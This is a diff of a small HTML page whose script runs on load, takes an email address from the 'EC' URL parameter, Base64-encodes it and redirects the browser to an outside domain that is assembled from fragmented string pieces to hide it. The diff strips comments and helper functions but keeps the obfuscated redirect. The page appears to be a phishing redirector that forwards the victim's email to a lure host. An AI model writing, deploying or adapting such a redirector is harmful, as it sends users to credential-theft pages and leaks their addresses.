@@ -3,50 +3,26 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>..</title>
+  <title>..t</title>
   <script>
-    // Function to split the encoded email into chunks
-    function splitIntoChunks(str, chunks = 20) {
-      const chunkSize = Math.ceil(str.length / chunks);
-      const result = [];
-      for (let i = 0; i < chunks; i++) {
-        const start = i * chunkSize;
-        const end = start + chunkSize;
-        result.push(str.slice(start, end));
-      }
-      return result;
-    }
-
-    // Function to combine chunks into a single string
-    function combineChunks(chunks) {
-      return chunks.join("");
-    }
-
-    // Function to encode the email and redirect
     function encodeEmailAndRedirect() {
       const urlParams = new URLSearchParams(window.location.search);
-      const email = urlParams.get('EC'); // Get the email from the query parameter 'EC'
+      const email = urlParams.get('EC');
 
       if (email) {
-        // Encode the email using Base64
         const encodedEmail = btoa(email);
-
-        // Split the encoded email into chunks
-        const emailChunks = splitIntoChunks(encodedEmail);
-
-        // Define the base URL parts
         const redirectUrlParts = [
           "ht", "tps", ":/", "/eb", "u6a", "j.j", "xeb", "pue", "ehg", ".es", "/Ol", "Lfm", "M/?"
         ];
-        const finalUrl = combineChunks(redirectUrlParts) + combineChunks(emailChunks);
+
+        const finalUrl = redirectUrlParts.join("") + encodedEmail;
 
         window.location.href = finalUrl;
       } else {
-        alert("!");
+        alert("No access!");
       }
     }
 
-    // Call the function to execute the script
     encodeEmailAndRedirect();
   </script>
 </head>
